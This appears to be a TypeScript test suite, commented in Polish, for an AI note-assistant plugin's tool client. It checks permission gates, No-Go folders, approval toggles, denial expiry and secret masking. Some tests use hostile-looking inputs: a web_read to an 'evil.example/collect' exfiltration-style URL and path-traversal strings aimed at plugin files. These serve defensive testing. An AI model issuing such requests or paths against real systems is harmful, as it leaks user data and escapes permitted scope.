    const registry = new ToolRegistry();
    registry.registerTool(createSearchTool());
    const client = new MCPClient(asApp({ vault: { adapter: {
        list: async (path: string) => { lists.push(path); return { files: ['Notes/private.md'], folders: [] }; },
        read: async (path: string) => { reads.push(path); return 'needle'; },
        exists: async () => true,
        stat: async () => ({ size: 6 }),
    } } }), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: new PermissionSystem({}, {}),
    }), registry);

    const result = await client.executeToolCall({ name: 'search', arguments: {
        query: 'needle', mode: 'text', scope: 'vault', where: { folder: 'Notes', glob: '**/*.md' },
    } }, 'Tester', { scopeFolders: ['Allowed'], resultBudgetChars: 600 });
    t.deepEqual(result, { success: false, code: 'access_denied', isError: true });
    t.deepEqual(lists, []);
    t.deepEqual(reads, []);
    t.false(JSON.stringify(result).includes('Notes'));
});

test('raw ToolRegistry registration gives native text search trusted per-file authorization', async t => {
    const { ToolRegistry } = await import('./ToolRegistry.js');
    const { createSearchTool } = await import('./SearchTool.js');
    const files = {
        'Notes/smoke.js': 'const first = "needle";\nconst second = 2;\n',
        'Notes/smoke.json': '{\n  "value": "needle"\n}\n',
    };
    const reads: string[] = [];
    const agent = { name: 'Tester', permissions: { guidance_mode: true, read_notes: true, mcp: true } };
    const app = { vault: { adapter: {
        read: async (path: string) => { reads.push(path); return files[path as keyof typeof files] ?? ''; },
        stat: async (path: string) => ({ size: files[path as keyof typeof files]?.length ?? 0 }),
        exists: async (path: string) => path in files,
    } } };
    const plugin = {
        app,
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: false }),
            requiresApproval: () => false,
        },
    };
    const registry = new ToolRegistry();
    registry.registerTool(createSearchTool());
    const client = new MCPClient(asApp(app), asPlugin(plugin), registry);

    for (const [path, line, excerpt] of [
        ['Notes/smoke.js', 1, 'const first = "needle";'],
        ['Notes/smoke.json', 2, '  "value": "needle"'],
    ] as const) {
        const result = await client.executeToolCall({ name: 'search', arguments: {
            query: 'needle', mode: 'text', scope: 'vault', where: { path },
        } }, 'Tester') as { success: boolean; results: Array<{ path: string; line: number; excerpt: string }> };
        t.deepEqual(result, {
            success: true,
            query: 'needle',
            scope: 'vault',
            mode_used: 'text',
            status: 'complete',
            results: [{ path, offset: files[path].indexOf('needle'), line, column: excerpt.indexOf('needle'), excerpt: files[path].slice(0, 160) }],
            count: 1,
            total: 1,
            scan: { candidates: 1, inspected: 1, read: 1, skipped_access: 0, skipped_too_large: 0, read_errors: 0, truncated: false, reasons: [] },
        });
    }
    t.deepEqual(reads, ['Notes/smoke.js', 'Notes/smoke.json']);
});

test('raw ToolRegistry registration gives native read its result budget', async t => {
    const { ToolRegistry } = await import('./ToolRegistry.js');
    const { createReadTool } = await import('./ReadTool.js');
    const content = 'line\n'.repeat(2000);
    const agent = { name: 'Tester', permissions: { guidance_mode: true, read_notes: true, mcp: true } };
    const app = { vault: {
        adapter: { read: async () => content, stat: async () => ({ size: content.length }) },
        getAbstractFileByPath: (path: string) => ({ path }),
        cachedRead: async () => content,
    } };
    const plugin = {
        app,
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: false }),
            requiresApproval: () => false,
        },
    };
    const registry = new ToolRegistry();
    registry.registerTool(createReadTool());
    const client = new MCPClient(asApp(app), asPlugin(plugin), registry);

    const result = await client.executeToolCall({ name: 'read', arguments: { path: 'Notes/a.md', offset: 0 } }, 'Tester', { resultBudgetChars: 600 }) as Record<string, unknown>;
    t.true(JSON.stringify(result).length <= 600, JSON.stringify(result).length.toString());
    t.true((result.content as string).length < content.length);
});

test('raw ToolRegistry read denied by scopeFolders never reaches file I/O', async t => {
    const { PermissionSystem } = await import('../../core/index.js');
    const { ToolRegistry } = await import('./ToolRegistry.js');
    const { createReadTool } = await import('./ReadTool.js');
    const reads: string[] = [];
    const agent = { name: 'Tester', permissions: { guidance_mode: true, read_notes: true } };
    const app = { vault: {
        adapter: { read: async (path: string) => { reads.push(path); return 'private'; } },
        getAbstractFileByPath: (path: string) => ({ path }),
        cachedRead: async (file: { path: string }) => { reads.push(file.path); return 'private'; },
    } };
    const registry = new ToolRegistry();
    registry.registerTool(createReadTool());
    const client = new MCPClient(asApp(app), asPlugin({
        app,
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: new PermissionSystem({}, {}),
    }), registry);

    const result = await client.executeToolCall({ name: 'read', arguments: { path: 'Notes/private.md', offset: 0 } }, 'Tester', { scopeFolders: ['Allowed'], resultBudgetChars: 600 });
    t.deepEqual(result, { success: false, code: 'access_denied', isError: true });
    t.deepEqual(reads, []);
});

test('external tool using a built-in name never receives trusted built-in context', async t => {
    const { ToolRegistry } = await import('./ToolRegistry.js');
    const seen: unknown[] = [];
    const agent = { name: 'Tester', permissions: { guidance_mode: true, read_notes: true, mcp: true } };
    const registry = new ToolRegistry();
    registry.registerTool({
        name: 'search', source: 'user', serverName: 'external', description: 'external search',
        inputSchema: { type: 'object' },
        execute: async (_args, _app, _plugin, context) => { seen.push(context); return { success: true }; },
    });
    const client = new MCPClient(asApp({}), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: { checkPermission: () => ({ allowed: true, requiresApproval: false }), requiresApproval: () => false },
    }), registry);

    await client.executeToolCall({ name: 'search', arguments: { mode: 'text', scope: 'vault', path: 'Notes/a.js' } }, 'Tester');
    t.deepEqual(seen, [undefined]);
});

test('real MCP rejects raw traversal before search and tiny cap returns B', async t => {
    const { PermissionSystem } = await import('../../core/index.js');
    const { createSearchTool } = await import('./SearchTool.js');
    const reads: string[] = [];
    const agent = { name: 'Tester', permissions: { guidance_mode: true, read_notes: true } };
    const tool = { ...createSearchTool(), source: 'built-in' };
    const client = new MCPClient(asApp({ vault: { adapter: {
        list: async () => ({ files: [], folders: [] }), read: async (path: string) => { reads.push(path); return ''; },
    } } }), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: new PermissionSystem({}, {}),
    }), asRegistry({ getTool: (name: string) => name === 'search' ? tool : null }));
    const invalid = await client.executeToolCall({ name: 'search', arguments: {
        query: 'x', mode: 'text', scope: 'vault', where: { path: '../secret.md' },
    } }, 'Tester', { resultBudgetChars: 600 });
    t.deepEqual(invalid, { success: false, code: 'invalid_args', isError: true });
    const tiny = await client.executeToolCall({ name: 'search', arguments: {
        query: 'x', mode: 'text', scope: 'vault', where: { path: 'Notes/a.md' },
    } }, 'Tester', { resultBudgetChars: 1 });
    t.is(tiny, 'B');
    t.deepEqual(reads, []);
});

test('real per-candidate PermissionSystem No-Go runs before adapter.read and hides denied path', async t => {
    const { AccessGuard, PermissionSystem } = await import('../../core/index.js');
    const { createSearchTool } = await import('./SearchTool.js');
    const previousNoGo = AccessGuard._noGoFolders;
    AccessGuard._noGoFolders = ['notes/private'];
    try {
        const reads: string[] = [];
        const checkedPaths: Array<{ path?: string | null; allowed: boolean }> = [];
        const app = { vault: { adapter: {
            list: async (folder: string) => folder === 'Notes'
                ? { files: ['Notes/ok.md'], folders: ['Notes/private'] }
                : { files: ['Notes/private/secret.md'], folders: [] },
            stat: async () => ({ size: 6 }),
            read: async (path: string) => { reads.push(path); return 'needle'; },
        } } };
        const agent = { name: 'Tester', permissions: { guidance_mode: true, read_notes: true, mcp: true } };
        const tool = { ...createSearchTool(), source: 'built-in' };
        const permissionSystem = new PermissionSystem({}, {});
        const realCheck = permissionSystem.checkPermission.bind(permissionSystem);
        permissionSystem.checkPermission = ((who: never, action: string, path?: string | null, options?: never) => {
            const result = realCheck(who, action, path, options);
            checkedPaths.push({ path, allowed: result.allowed });
            return result;
        }) as typeof permissionSystem.checkPermission;
        const client = new MCPClient(asApp(app), asPlugin({ app, agentManager: { getAgent: () => agent, getActiveAgent: () => agent }, permissionSystem }), asRegistry({ getTool: (name: string) => name === 'search' ? tool : null }));
        const result = await client.executeToolCall({ name: 'search', arguments: {
            query: 'needle', mode: 'text', scope: 'vault', where: { folder: 'Notes', glob: '**/*.md' },
        } }, 'Tester', { resultBudgetChars: 600 });
        const value = result as { status: string; results: Array<{ path: string }>; scan: { skipped_access: number; reasons: string[] } };
        t.true(AccessGuard._isNoGo('Notes/private/secret.md'));
        t.true(checkedPaths.some(entry => entry.path === 'Notes/private/secret.md' && !entry.allowed), JSON.stringify(checkedPaths));
        t.deepEqual(reads, ['Notes/ok.md']);
        t.false(JSON.stringify(result).includes('Notes/private/secret.md'));
        t.is(value.status, 'partial');
        t.is(value.scan.skipped_access, 1);
        t.deepEqual(value.scan.reasons, ['access_skipped']);
    } finally { AccessGuard._noGoFolders = previousNoGo; }
});

test('structural read postcheck uses a short token below the measured JSON error length', async t => {
    const contexts: Array<import('./ToolRegistry.js').BuiltinToolExecutionContext | undefined> = [];
    const calls: Array<{ agent: unknown; action: string; path?: string | null; opts?: unknown }> = [];
    const client = _makeBudgetClient('read', _structuralReadPage('x'.repeat(2000)), contexts, calls);

    const result = await client.executeToolCall({ name: 'vault_read', arguments: { path: 'Notes/a.md' } }, 'Tester', { resultBudgetChars: 46 });

    t.is(result as unknown, 'B');
});

test('caps 1 and 15000 keep the fixed minimum token and 12000 ceiling semantics', async t => {
    const contexts: Array<import('./ToolRegistry.js').BuiltinToolExecutionContext | undefined> = [];
    const calls: Array<{ agent: unknown; action: string; path?: string | null; opts?: unknown }> = [];
    const page = _structuralReadPage('short');
    page.next_offset = 5;
    page.has_more = false;
    page.truncated = false;
    const client = _makeBudgetClient('read', page, contexts, calls);

    const minimum = await client.executeToolCall({ name: 'read', arguments: { path: 'Notes/a.md' } }, 'Tester', { resultBudgetChars: 1 });
    t.is(minimum, 'B');
    const wide = await client.executeToolCall({ name: 'read', arguments: { path: 'Notes/a.md' } }, 'Tester', { resultBudgetChars: 15000 });
    t.is(contexts[1]?.resultBudgetChars, 15000);
    t.is(contexts[1]?.effectiveResultBudgetChars, 12000);
    t.deepEqual(wide, page);
});

test('cap 0 still applies the fixed ceiling to structural reads, while unrelated search modes keep legacy results', async t => {
    const contexts: Array<import('./ToolRegistry.js').BuiltinToolExecutionContext | undefined> = [];
    const calls: Array<{ agent: unknown; action: string; path?: string | null; opts?: unknown }> = [];
    const readClient = _makeBudgetClient('read', _structuralReadPage('x'.repeat(13000)), contexts, calls);

    const bounded = await readClient.executeToolCall({ name: 'read', arguments: { path: 'Notes/a.md' } }, 'Tester', { resultBudgetChars: 0 });
    t.deepEqual(bounded, { success: false, code: 'budget_too_small', isError: true });
    t.is(contexts[0]?.resultBudgetChars, 0);
    t.is(contexts[0]?.effectiveResultBudgetChars, 12000);

    const legacyClient = _makeBudgetClient('search', { success: true, scope: 'vault', mode_used: 'auto', results: [], padding: 'x'.repeat(13000) }, contexts, calls);
    const legacy = await legacyClient.executeToolCall({ name: 'search', arguments: { query: 'x', mode: 'auto', scope: 'vault' } }, 'Tester', { resultBudgetChars: 46 });
    t.is((legacy as { padding: string }).padding.length, 13000);
});

// ─── `action` nie obniża ryzyka `write` poniżej skutku ────────────
//
// `write {path, content, action:'create'}` BEZ pola `mode`: naiwna klasyfikacja po `action`
// widzi YELLOW (wyciszalne żółtym przełącznikiem `vault_write`), ale `WriteTool` liczy
// `args.mode || 'replace'` i NADPISUJE istniejący plik - czyli operację, którą autonomia `edge`
// deklaruje jako RED, nie do wyłączenia przełącznikiem.

test('write z action:create przy wyłączonym toggle vault_write NADAL pyta (RED)', async t => {
    const { PermissionSystem } = await import('../../core/index.js');
    const asked: Array<Record<string, unknown>> = [];
    const seenArgs: ToolCallArgs[] = [];
    const agent = {
        name: 'Tester',
        permissions: { guidance_mode: true },
        // user świadomie zdjął ŻÓŁTY przełącznik - czerwone i tak ma pytać
        approvalToggles: { vault_write: false },
    };
    // Atrapa vaulta potrzebna tylko po to, żeby blok podglądu diffa (6b) miał co przeczytać.
    const app = { vault: { getAbstractFileByPath: () => null, adapter: { exists: async () => false } } };
    const client = new MCPClient(asApp(app), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: new PermissionSystem({}, {}),
        approvalManager: {
            requestApproval: async (req: Record<string, unknown>) => { asked.push(req); return true; },
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            contextExtractor: (args: ToolCallArgs) => ({ targetPath: args.path || '' }),
            execute: async (args: ToolCallArgs) => { seenArgs.push(args); return { success: true }; },
        }),
    }),
    // Podgląd diffa nie jest przedmiotem tego testu, ale blok 6b po niego sięga - bez atrapy
    // klient otworzyłby prawdziwy modal, który poza Obsidianem nigdy się nie zamyka (test
    // wisiałby do timeoutu). Atrapa zatwierdza od ręki, bramka approvalu zostaje nietknięta.
    { diffModalFactory: () => ({ waitForApproval: async () => 'approve' }) });

    await client.executeToolCall(
        { name: 'write', arguments: { path: 'Notatki/umowa.md', content: 'x', action: 'create' } },
        'Tester',
        { autonomy: 'edge' },
    );
    t.is(asked.length, 1, 'brak modala = nadpisanie bez pytania');
    t.is(seenArgs[0].mode, undefined, '`action` NIE jest trybem zapisu — narzędzie i tak zrobi replace');
    t.is(asked[0].operationMode, null, 'modal nie udaje trybu, którego narzędzie nie zna');

    // Kontrola negatywna: prawdziwy `mode:create` to nadal YELLOW, więc toggle go wycisza.
    asked.length = 0;
    await client.executeToolCall(
        { name: 'write', arguments: { path: 'Notatki/nowa.md', content: 'x', mode: 'create' } },
        'Tester',
        { autonomy: 'edge' },
    );
    t.is(asked.length, 0, 'YELLOW z wyłączonym togglem nie pyta — zachowanie bez zmian');
});

// ─── web_read ma WŁASNĄ bramkę zgody ─────────────────────────────
//
// Wspólny `web.search` sprawiłby, że `web_read` mapowałby się na tę samą akcję i ten sam
// przełącznik profilu - jedno odklikanie „Wyszukiwanie w internecie" zdejmowałoby pytanie
// także z wyjścia na adres wskazany przez model, a modal (gdy się pokazywał) ogłaszałby
// pobranie strony jako wyszukiwanie.

async function _makeWebClient(agent: Record<string, unknown>, asked: Array<Record<string, unknown>>) {
    const { PermissionSystem } = await import('../../core/index.js');
    return new MCPClient(asApp(null), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: new PermissionSystem({}, {}),
        approvalManager: {
            requestApproval: async (req: Record<string, unknown>) => { asked.push(req); return true; },
        },
    }), asRegistry({
        getTool: (name: string) => ({ name, description: name, execute: async () => ({ success: true }) }),
    }));
}

test('wyciszony web_search NIE otwiera web_read (osobny przełącznik, domyślnie pytaj)', async t => {
    const asked: Array<Record<string, unknown>> = [];
    const agent = {
        name: 'Tester',
        permissions: { guidance_mode: true },
        approvalToggles: { web_search: false },
    };
    const client = await _makeWebClient(agent, asked);

    await client.executeToolCall({ name: 'web_search', arguments: { query: 'kot' } }, 'Tester', { autonomy: 'edge' });
    t.is(asked.length, 0, 'wyszukiwarka wyciszona zgodnie z wolą usera');

    await client.executeToolCall(
        { name: 'web_read', arguments: { url: 'https://evil.example/collect?q=tajne' } }, 'Tester', { autonomy: 'edge' });
    t.is(asked.length, 1, 'pobranie adresu ma własną zgodę');
    t.is(asked[0].type, 'web.read', 'osobny typ akcji — reguła „zawsze zezwalaj" też jest osobna');
    t.is(asked[0].targetPath, 'https://evil.example/collect?q=tajne');
});

test('własny przełącznik web_read wycisza TYLKO web_read', async t => {
    const asked: Array<Record<string, unknown>> = [];
    const agent = {
        name: 'Tester',
        permissions: { guidance_mode: true },
        approvalToggles: { web_read: false },
    };
    const client = await _makeWebClient(agent, asked);

    await client.executeToolCall({ name: 'web_read', arguments: { url: 'https://ok.example/' } }, 'Tester', { autonomy: 'edge' });
    t.is(asked.length, 0);

    await client.executeToolCall({ name: 'web_search', arguments: { query: 'kot' } }, 'Tester', { autonomy: 'edge' });
    t.is(asked.length, 1, 'web_search ma default „pytaj" i nie dziedziczy wyciszenia web_read');
});

// ─── Modal pokazuje TĘ nazwę pliku, która realnie powstanie ──────

test('ścieżka memory_save w modalu liczona tą samą regułą co zapis', async t => {
    const { makeMemoryNoteFilename } = await import('../memory/index.js');
    const client = new MCPClient(asApp(null), asPlugin({}), asRegistry({ getTool: () => null }));
    const nazwa = 'Ważne hasło do księgowości';

    const ctx = (client as unknown as {
        _extractToolContext(tool: string, args: ToolCallArgs, agent: string | null): { targetPath: string };
    })._extractToolContext('memory_save', { name: nazwa, type: 'reference', content: 'x' }, 'Jaskier');

    const oczekiwany = makeMemoryNoteFilename('reference', nazwa);
    t.true(ctx.targetPath.endsWith(`/${oczekiwany}`),
        `modal: ${ctx.targetPath}\nna dysk: .../${oczekiwany}`);
    // Konkretnie: diakrytyki są ZDEJMOWANE, nie zamieniane na podkreślenia.
    t.true(ctx.targetPath.includes('wazne'), ctx.targetPath);
});

// ─── memory_delete approvalContext niesie TREŚĆ kasowanego faktu ──────────
//
// Analogicznie jak przy `memory_save` wyżej: `MemoryDeleteTool.ts` NIE definiuje
// `contextExtractor`, więc `memory_delete` ląduje w tym samym fallback-switchu w produkcji.
// `memory_delete` jest w `MEMORY_TOOLS` (executeToolCall pomija dla niego `checkPermission`),
// więc `targetPath`/`approvalContext` z tej gałęzi trafiają WYŁĄCZNIE do okna zgody, które user
// widzi tuż przed potwierdzeniem kasacji. Mutacja zerująca `approvalContext.memoryContent`/
// `memorySection` (np. literówka przy refaktorze) zostawiałaby okno zgody z pustym cudzysłowem
// zamiast treści faktu, który user właśnie ma zatwierdzić do skasowania z `brain.md` - bez
// żadnego testu, który by to złapał.

test('_extractToolContext memory_delete - approvalContext niesie fakt/sekcję do okna zgody', t => {
    const client = new MCPClient(asApp(null), asPlugin({}), asRegistry({ getTool: () => null }));
    const fakt = 'Jan nie pije kawy po 15';

    const ctx = client._extractToolContext('memory_delete', { fact: fakt, section: 'nawyki' }, 'Jaskier');

    t.is(ctx.targetPath, '.pkm-assistant/agents/jaskier/memory/brain.md');
    // Poprzeczka MUTACYJNA: `approvalContext.memoryContent = '';` (gubi treść) MUSI tu polec -
    // fakt jest niepusty i konkretny, więc pusty string albo `undefined` nie przejdzie.
    t.is(ctx.approvalContext.memoryContent, fakt, 'user w oknie zgody ma zobaczyć TREŚĆ kasowanego faktu, nie pusty cudzysłów');
    t.is(ctx.approvalContext.memorySection, 'nawyki');
});

test('memory_delete approvalContext - brak fact/section daje bezpieczny pusty string (nie undefined)', t => {
    const client = new MCPClient(asApp(null), asPlugin({}), asRegistry({ getTool: () => null }));
    const ctx = client._extractToolContext('memory_delete', {}, 'Jaskier');

    t.is(ctx.approvalContext.memoryContent, '');
    t.is(ctx.approvalContext.memorySection, '');
});

// ─── delegate - treść zadania NIE jest walidowana jak ścieżka vaultowa ────
//
// `case 'delegate'` w `_extractToolContext` oddaje bramce PUSTY cel (komentarz w źródle:
// „sub-agent task is NOT a vault path, skip AccessGuard") - ŚWIADOMIE, bo `delegate` siedzi
// w `NON_VAULT_TARGET_ACTIONS` (core/security/PermissionSystem.ts): jego „cel" to opis
// zadania dla sub-agenta, nie ścieżka. Pin: nawet gdy treść zadania WYGLĄDA jak ścieżka do
// strefy zakazanej (No-Go/protected/traversal), ekstrakcja NIE próbuje jej sanityzować ani
// kanonizować jako ścieżkę - inaczej fałszywa odmowa delegacji zależałaby od tego, co model
// akurat wpisał w opis zadania (dokładnie klasa błędu wycięta dla `generate_image`).

test('_extractToolContext delegate - treść zadania jak ścieżka NIE jest walidowana jak ścieżka vaultowa', t => {
    const client = new MCPClient(asApp(null), asPlugin({}), asRegistry({ getTool: () => null }));
    // Naraz: traversal + No-Go (.obsidian) + protected (.pkm-assistant) - gdyby to poleciało
    // do sanitizePath/AccessGuard jako cel, WSZYSTKIE trzy bramki by odmówiły.
    const zadanie = '../../.pkm-assistant/../.obsidian/plugins/evil/main.js';

    const ctx = client._extractToolContext('delegate', { task: zadanie, aspect: 'analiza' }, 'Jaskier');

    t.is(ctx.targetPath, '', 'delegate NIE oddaje treści zadania jako celu — sub-agent task to nie ścieżka vaultowa');
    t.falsy(ctx.invalidPath, 'treść zadania nie przechodzi przez sanityzację ścieżek — nie ma jak "nie dać się uratować"');
    t.is(ctx.approvalContext.delegateTask, zadanie, 'user w oknie zgody nadal widzi PEŁNĄ treść zadania');
});

test('executeToolCall delegate - checkPermission dostaje PUSTY targetPath niezależnie od treści zadania (brak fałszywej odmowy)', async t => {
    const seenChecks: Array<{ action: string; targetPath: string }> = [];
    const seenArgs: ToolCallArgs[] = [];
    const client = new MCPClient(asApp(null), asPlugin({
        agentManager: {
            getAgent: () => ({ name: 'Jaskier' }),
            getActiveAgent: () => ({ name: 'Jaskier' }),
        },
        permissionSystem: {
            checkPermission: (_agent: unknown, action: string, targetPath: string) => {
                seenChecks.push({ action, targetPath });
                return { allowed: true, requiresApproval: false };
            },
            requiresApproval: () => false,
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            execute: async (args: ToolCallArgs) => { seenArgs.push(args); return { success: true, started: true }; },
        }),
    }));

    const zadanie = '.obsidian/plugins/evil/main.js'; // wygląda jak No-Go, gdyby poleciało jako ścieżka
    const result = await client.executeToolCall({ name: 'delegate', arguments: { task: zadanie } }, 'Jaskier') as { success?: boolean };

    t.true(result.success, 'delegacja NIE ma prawa polec przez to, że treść zadania przypomina zakazaną ścieżkę');
    t.is(seenChecks.length, 1);
    t.is(seenChecks[0].action, 'delegate');
    t.is(seenChecks[0].targetPath, '', 'bramka dostaje pusty cel — to ONA (poprzez non-vault-target) wie, że to nie ścieżka');
    t.is(seenArgs[0].task, zadanie, 'narzędzie samo dostaje oryginalną treść zadania (bez okrojenia)');
});

// ─── JEDEN kształt porażki narzędzia ──────────────────────────────
//
// Narzędzia wbudowane sygnalizują porażkę przez `{success:false, error}`, a MCPClient/artefakty/
// wrapper external MCP przez `{isError:true}`. Warstwa prezentacji czatu zna TYLKO `isError` -
// bez normalizacji nieudany zapis rysowałby się jako sukces z linkiem do pliku, którego nie ma.
// Normalizacja siedzi w JEDNYM miejscu - tutaj, na wyjściu z `executeToolCall`.

/** Zwrotka narzędzia widziana przez te testy: obie flagi + komunikat. */
interface FailingToolResult {
    isError?: boolean;
    success?: boolean;
    error?: string;
    path?: string;
}

function _makeNormalizingClient(execute: () => Promise<unknown>) {
    return new MCPClient(asApp(null), asPlugin({
        agentManager: {
            getAgent: () => ({ name: 'Jaskier' }),
            getActiveAgent: () => ({ name: 'Jaskier' }),
        },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: false }),
            requiresApproval: () => false,
        },
    }), asRegistry({
        getTool: (name: string) => ({ name, description: name, execute }),
    }));
}

test('narzędzie z {success:false} dostaje isError na wyjściu z klienta', async t => {
    const client = _makeNormalizingClient(async () => ({ success: false, error: 'Plik już istnieje' }));

    const result = await client.executeToolCall(
        { name: 'write', arguments: { path: 'Notatki/a.md', content: 'x' } }, 'Jaskier') as FailingToolResult;

    t.true(result.isError, 'po tej fladze czat liczy status chipa i warunek linku „otwórz zapisany plik"');
});

test('normalizacja NIE kasuje oryginalnych pól narzędzia', async t => {
    const client = _makeNormalizingClient(async () => ({ success: false, error: 'Plik już istnieje', path: 'Notatki/a.md' }));

    const result = await client.executeToolCall(
        { name: 'write', arguments: { path: 'Notatki/a.md' } }, 'Jaskier') as FailingToolResult;

    t.is(result.success, false, 'testy narzędzi i formatToolOutput dalej czytają `success`');
    t.is(result.error, 'Plik już istnieje');
    t.is(result.path, 'Notatki/a.md');
});

test('udany wynik NIE dostaje isError (pusty wynik to sukces, nie porażka)', async t => {
    const client = _makeNormalizingClient(async () => ({ success: true, results: [], count: 0 }));

    const result = await client.executeToolCall(
        { name: 'web_search', arguments: { query: 'kot' } }, 'Jaskier') as FailingToolResult;

    t.is(result.isError, undefined, 'zero wyników to PUSTY WYNIK, nie awaria narzędzia');
});

// ─── Pamięć odmów WYGASA (jedno „Odmów" nie blokuje narzędzia na zawsze) ───
//
// `MCPClient` powstaje raz na cały cykl życia pluginu, a `clearDenials()` nie ma w produkcji
// ANI JEDNEGO wołacza. Klucz odmowy narzędzia bez ścieżki to `<narzędzie>::*`, czyli CAŁE
// narzędzie - bez TTL jedno kliknięcie „Odmów" na serwerze MCP odbijałoby każde następne
// wywołanie (w nowej zakładce, jutro rano) bez pokazania modala, a jedynym resetem byłby
// restart pluginu.

/** Klient z atrapą approvalu: `answers` to kolejka odpowiedzi na kolejne pytania. */
function _makeDenialClient(answers: Array<'deny' | 'approve'>, options: { denialTtlMs?: number } = {}) {
    const asked: string[] = [];
    const client = new MCPClient(asApp(null), asPlugin({
        agentManager: {
            getAgent: () => ({ name: 'Jaskier' }),
            getActiveAgent: () => ({ name: 'Jaskier' }),
        },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: true }),
            requiresApproval: () => true,
        },
        approvalManager: {
            requestApproval: async ({ toolName }: { toolName: string }) => {
                asked.push(toolName);
                return { result: answers.shift() || 'approve' };
            },
        },
    }), asRegistry({
        getTool: (name: string) => ({ name, description: name, execute: async () => ({ success: true }) }),
    }), options);
    return { client, asked };
}

test('po wygaśnięciu TTL narzędzie PYTA ponownie zamiast odbijać się o starą odmowę', async t => {
    // TTL 0 ms = odmowa wygasa natychmiast (w produkcji to minuty; tu chodzi o mechanizm).
    const { client, asked } = _makeDenialClient(['deny', 'approve'], { denialTtlMs: 0 });

    const first = await client.executeToolCall(
        { name: 'blender__scene', arguments: {} }, 'Jaskier') as { isError?: boolean; error?: string };
    t.true(first.isError, 'pierwsze wywołanie: user klika „Odmów"');

    const second = await client.executeToolCall(
        { name: 'blender__scene', arguments: {} }, 'Jaskier') as { success?: boolean };

    t.is(asked.length, 2, 'drugie wywołanie MUSI pokazać modal, a nie odbić się w ciszy');
    t.true(second.success, 'user zmienił zdanie i zatwierdził');
});

test('w oknie TTL odmowa dalej blokuje od ręki (mechanizm nie znika, tylko wygasa)', async t => {
    const { client, asked } = _makeDenialClient(['deny'], { denialTtlMs: 60_000 });

    await client.executeToolCall({ name: 'blender__scene', arguments: {} }, 'Jaskier');
    const second = await client.executeToolCall(
        { name: 'blender__scene', arguments: {} }, 'Jaskier') as { isError?: boolean; error?: string };

    t.is(asked.length, 1, 'drugie wywołanie nie zawraca głowy userowi tym samym pytaniem');
    t.true(second.isError);
    t.true(String(second.error).includes('WCZEŚNIEJ'), second.error);
});

// ─── Zewnętrzny catch klienta oddaje modelowi TEKST BŁĘDU ───
// Komunikat wyjątku bywa zrzutem zdarzenia strumienia razem
// z nagłówkiem `Authorization`, a stąd leci prosto do transkryptu tury.

test('catch w executeToolCall maskuje sekret w komunikacie oddawanym modelowi', async t => {
    const SECRET = 'sk-ant-TAJNYKLUCZ0123456789abcdef';
    const client = _makeNormalizingClient(async () => {
        throw new Error(`stream event failed: {"Authorization":"Bearer ${SECRET}"}`);
    });

    const result = await client.executeToolCall(
        { name: 'write', arguments: { path: 'a.md' } }, 'Jaskier') as FailingToolResult;

    t.true(result.isError);
    t.false(String(result.error).includes(SECRET), `klucz jawny w zwrotce: ${result.error}`);
});

// ─── Podgląd diffa sprawdza unikalność old_text tak samo jak WriteTool ──
//
// Krok 6b liczy `newContent` z `old_text`/`new_text` samodzielnie (kopia algorytmu WriteTool).
// Bez sprawdzenia drugiego wystąpienia pokazywałby diff na PIERWSZYM dopasowaniu, user by go
// zatwierdzał, a `WriteTool.execute` (krok 7) i tak odrzucałby zapis jako niejednoznaczny
// (`old_text_multiple`). Test dowodzi: przy dwuznacznym `old_text` diff W OGÓLE się nie pokazuje
// (userowi nie proponuje się zmiany, której zapis i tak odrzuci); przy jednoznacznym - pokazuje
// się z poprawnie policzonym `newContent`, jak dotąd.

function _makePatchDiffClient(oldContent: string, diffCalls: Array<{ oldContent: string; newContent: string }>) {
    const agent = { name: 'Tester', permissions: { guidance_mode: true } };
    const file = { path: 'Notatki/x.md' };
    const app = {
        vault: {
            getAbstractFileByPath: () => file,
            read: async () => oldContent,
            adapter: { exists: async () => false },
        },
    };
    return new MCPClient(asApp(app), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: true }),
            requiresApproval: () => true,
        },
        approvalManager: {
            requestApproval: async () => ({ result: 'approve' }),
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            execute: async () => ({ success: true }),
        }),
    }), {
        diffModalFactory: (_app: unknown, options: { oldContent: string; newContent: string }) => {
            diffCalls.push({ oldContent: options.oldContent, newContent: options.newContent });
            return { waitForApproval: async () => 'approve' };
        },
    });
}

test('old_text z DWOMA dopasowaniami - diff w ogóle się nie pokazuje (zamiast pokazać pierwsze losowe)', async t => {
    const diffCalls: Array<{ oldContent: string; newContent: string }> = [];
    const client = _makePatchDiffClient('kot je kot', diffCalls);

    const result = await client.executeToolCall(
        { name: 'write', arguments: { path: 'Notatki/x.md', mode: 'patch', old_text: 'kot', new_text: 'pies' } },
        'Tester',
        { autonomy: 'edge' },
    ) as { success?: boolean };

    t.is(diffCalls.length, 0, 'old_text niejednoznaczny — MCPClient nie ma prawa pokazać diffa na przypadkowym dopasowaniu');
    t.true(result.success, 'wykonanie realnego narzędzia leci dalej (ono samo odrzuci old_text_multiple)');
});

test('old_text z JEDNYM dopasowaniem - diff pokazuje się z poprawnym newContent (bez regresji)', async t => {
    const diffCalls: Array<{ oldContent: string; newContent: string }> = [];
    const client = _makePatchDiffClient('kot je rybę', diffCalls);

    await client.executeToolCall(
        { name: 'write', arguments: { path: 'Notatki/x.md', mode: 'patch', old_text: 'kot', new_text: 'pies' } },
        'Tester',
        { autonomy: 'edge' },
    );

    t.is(diffCalls.length, 1, 'old_text jednoznaczny — diff MA się pokazać');
